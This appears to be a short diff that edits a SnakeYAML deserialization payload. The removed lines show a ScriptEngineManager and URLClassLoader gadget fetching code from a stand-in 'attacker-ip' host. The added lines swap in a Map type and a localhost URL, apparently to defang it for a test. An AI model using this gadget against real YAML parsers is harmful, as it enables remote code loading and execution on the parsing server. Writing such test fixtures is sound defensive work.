@@ -1,5 +1,5 @@
-!!javax.script.ScriptEngineManager [
+!!javax.util.Map [
   !!java.net.URLClassLoader [[
-    !!java.net.URL ["http://attacker-ip/"]
+    !!java.net.URL ["http://localhost/"]
   ]]
 ]
